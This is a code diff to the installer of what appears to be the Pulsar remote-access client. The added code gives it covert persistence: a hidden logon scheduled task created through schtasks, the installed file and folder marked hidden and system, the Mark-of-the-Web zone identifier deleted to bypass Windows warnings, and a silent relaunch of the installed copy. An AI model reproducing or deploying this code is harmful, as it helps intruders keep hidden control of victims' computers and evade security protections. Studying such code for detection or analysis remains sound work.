@@ -13,108 +13,154 @@ namespace Pulsar.Client.Setup
     {
         public void ApplySettings()
         {
-            string clientPath;
-            try
+            string exePath = Application.ExecutablePath;
+            string installPath = Settings.INSTALLPATH;
+
+            // STARTUP
+            if (Settings.STARTUP)
             {
-                clientPath = Application.ExecutablePath;
+                var startup = new ClientStartup();
+                string startupTarget = Settings.INSTALL ? installPath : exePath;
+
+                startup.AddToStartup(startupTarget, Settings.STARTUPKEY);
             }
-            catch
+
+            //scheduled task
+            if (Settings.SCHEDULEDTASK)
             {
-                clientPath = null;
-            }
-            
-
-            if (Settings.STARTUP && clientPath != null)
-            {
-                var clientStartup = new ClientStartup();
-                if (Settings.INSTALL)
+                try
                 {
-                    clientStartup.AddToStartup(Settings.INSTALLPATH, Settings.STARTUPKEY);
+                    CreateScheduledTask(Settings.INSTALLPATH, Settings.STARTUPKEY);
                 }
-                else
+                catch (Exception ex)
                 {
-                    clientStartup.AddToStartup(Application.ExecutablePath, Settings.STARTUPKEY);
-                }
-
-                if (Settings.INSTALL && Settings.HIDEFILE)
-                {
-                    try
-                    {
-                        File.SetAttributes(Settings.INSTALLPATH, FileAttributes.Hidden);
-                    }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine(ex);
-                    }
-                }
-
-                if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
-                {
-                    try
-                    {
-                        DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLPATH));
-                        di.Attributes |= FileAttributes.Hidden;
-                    }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine(ex);
-                    }
+                    Debug.WriteLine("ScheduledTask Error: " + ex.Message);
                 }
             }
+
+            // FILE HIDE (Hidden + System)
+            if (Settings.INSTALL && Settings.HIDEFILE)
+            {
+                TrySetFileAttributes(installPath, FileAttributes.Hidden | FileAttributes.System);
+            }
+
+            // HIDE INSTALL DIRECTORY
+            if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY &&
+                !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
+            {
+                string dir = Path.GetDirectoryName(installPath);
+                TrySetDirectoryAttributes(dir, FileAttributes.Hidden | FileAttributes.System);
+            }
+        }
+        private void CreateScheduledTask(string exePath, string taskName)
+        {
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = "schtasks.exe",
+                Arguments = $"/Create /SC ONLOGON /TN \"{taskName}\" /TR \"\\\"{exePath}\\\"\" /F",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+                UseShellExecute = false
+            });
         }
 
         public void Install()
         {
-            // create target dir
-            if (!Directory.Exists(Path.GetDirectoryName(Settings.INSTALLPATH)))
-            {
-                Directory.CreateDirectory(Path.GetDirectoryName(Settings.INSTALLPATH));
-            }
+            string installPath = Settings.INSTALLPATH;
+            string installDir = Path.GetDirectoryName(installPath);
 
-            // delete existing file
-            if (File.Exists(Settings.INSTALLPATH))
+            // Ensure directory exists
+            if (!Directory.Exists(installDir))
+                Directory.CreateDirectory(installDir);
+
+            // Replace existing file if needed
+            HandleExistingInstallation(installPath);
+
+            // Copy new client
+            File.Copy(Application.ExecutablePath, installPath, true);
+
+            // Apply settings (startup, hiding, etc.)
+            ApplySettings();
+
+            // Remove MOTW
+            FileHelper.DeleteZoneIdentifier(installPath);
+
+            // Launch installed copy
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = installPath,
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+                UseShellExecute = false
+            });
+        }
+
+        // ---------------------------------------------------------------------
+
+        private void HandleExistingInstallation(string installPath)
+        {
+            if (!File.Exists(installPath))
+                return;
+
+            try
+            {
+                File.Delete(installPath);
+            }
+            catch (Exception ex) when (ex is IOException || ex is UnauthorizedAccessException)
+            {
+                KillExistingProcessAtPath(installPath);
+
+                // try delete again
+                try { File.Delete(installPath); }
+                catch { /* ignore */ }
+            }
+        }
+
+        private void KillExistingProcessAtPath(string installPath)
+        {
+            string procName = Path.GetFileNameWithoutExtension(installPath);
+            int currentPid = Process.GetCurrentProcess().Id;
+
+            foreach (var p in Process.GetProcessesByName(procName))
             {
                 try
                 {
-                    File.Delete(Settings.INSTALLPATH);
+                    if (p.Id == currentPid) continue;
+                    if (p.GetMainModuleFileName() != installPath) continue;
+
+                    p.Kill();
+                    p.WaitForExit(2000);
                 }
-                catch (Exception ex)
-                {
-                    if (ex is IOException || ex is UnauthorizedAccessException)
-                    {
-                        // kill old process running at destination path
-                        Process[] foundProcesses =
-                            Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Settings.INSTALLPATH));
-                        int myPid = Process.GetCurrentProcess().Id;
-                        foreach (var prc in foundProcesses)
-                        {
-                            // dont kill own process
-                            if (prc.Id == myPid) continue;
-                            // only kill the process at the destination path
-                            if (prc.GetMainModuleFileName() != Settings.INSTALLPATH) continue;
-                            prc.Kill();
-                            Thread.Sleep(2000);
-                            break;
-                        }
-                    }
-                }
+                catch { /* ignore */ }
             }
+        }
 
-            File.Copy(Application.ExecutablePath, Settings.INSTALLPATH, true);
+        // ---------------------------------------------------------------------
 
-            ApplySettings();
-
-            FileHelper.DeleteZoneIdentifier(Settings.INSTALLPATH);
-
-            //start file
-            var startInfo = new ProcessStartInfo
+        private void TrySetFileAttributes(string path, FileAttributes attrs)
+        {
+            try
             {
-                WindowStyle = ProcessWindowStyle.Hidden,
-                CreateNoWindow = true,
-                UseShellExecute = false,
-                FileName = Settings.INSTALLPATH
-            };
-            Process.Start(startInfo);
+                var existing = File.GetAttributes(path);
+                File.SetAttributes(path, existing | attrs);
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Failed to set file attrs: {ex}");
+            }
+        }
+
+        private void TrySetDirectoryAttributes(string path, FileAttributes attrs)
+        {
+            try
+            {
+                var di = new DirectoryInfo(path);
+                di.Attributes |= attrs;
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Failed to set dir attrs: {ex}");
+            }
         }
     }
 }
